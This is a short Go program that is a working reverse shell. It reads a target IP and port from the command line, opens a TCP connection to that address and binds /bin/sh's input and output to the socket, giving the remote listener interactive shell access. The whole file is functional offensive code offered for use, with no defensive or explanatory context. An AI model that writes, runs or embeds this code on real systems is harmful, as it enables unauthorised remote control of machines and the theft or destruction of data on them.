package main;

import (
	"os"
	"os/exec"
	"fmt"
	"net"
	"path/filepath"
);

func main() {
	// Create CLI interface with arguments
	args := os.Args;
	basename := filepath.Base(args[0]);

	if len(args) < 2 {
		fmt.Printf("usage: %s [-h] IP PORT\n", basename);
		fmt.Printf("%s: error: the following arguments are required: IP, PORT\n", basename);
		os.Exit(1)
	}

	if len(args) < 3 {
		fmt.Printf("usage: %s [-h] PORT\n", basename);
		fmt.Printf("%s: error: the following arguments are required: PORT\n", basename);
		os.Exit(1)
	}

	if len(args) > 3 {
		fmt.Printf("usage: %s [-h] IP PORT\n", basename);
		fmt.Printf("%s: error: unrecognized arguments: ", basename);
		fmt.Println(args[3:]);
		os.Exit(1)
	}

	// Parse arguments
	ip_addr := args[1];
	port := args[2];

	// Create a Network Socket and Connect to remote Machine
	c, _ := net.Dial("tcp", ip_addr + ":" + port);

	// Send reverse shell
	cmd := exec.Command("/bin/sh");
	cmd.Stdin = c;
	cmd.Stdout = c;
	cmd.Stderr = c;
	cmd.Run()
}